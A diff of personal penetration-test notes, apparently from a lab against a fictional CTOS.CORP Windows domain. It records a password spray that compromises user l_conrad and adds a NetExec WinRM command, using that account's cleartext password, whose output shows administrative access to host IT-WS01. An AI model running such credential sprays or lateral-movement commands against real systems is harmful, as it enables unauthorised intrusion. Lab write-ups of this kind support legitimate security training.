@@ -836,7 +836,7 @@ I have a PDF file
 
 I have found a password policy
 
-# Password spray
+# Password spray leads to user compromise
 
 There is 6 users aside fromt he service and machine accounts, i have all 6 full names from the home page on the web server
 
@@ -897,4 +897,12 @@ SMB         10.1.24.233     445    DC01             [+] CTOS.CORP\l_conrad:LIS!2
 ```
 
 I have compromised a user `l_conrad`
+
+```python
+nxc winrm it-ws01.ctos.corp -u l_conrad -p 'LIS!2026$ad'     
+WINRM       10.1.206.115    5985   IT-WS01          [*] Windows Server 2022 Build 20348 (name:IT-WS01) (domain:CTOS.CORP) 
+WINRM       10.1.206.115    5985   IT-WS01          [+] CTOS.CORP\l_conrad:LIS!2026$ad (Pwn3d!)
+```
+
+This user has access over winrm!
 
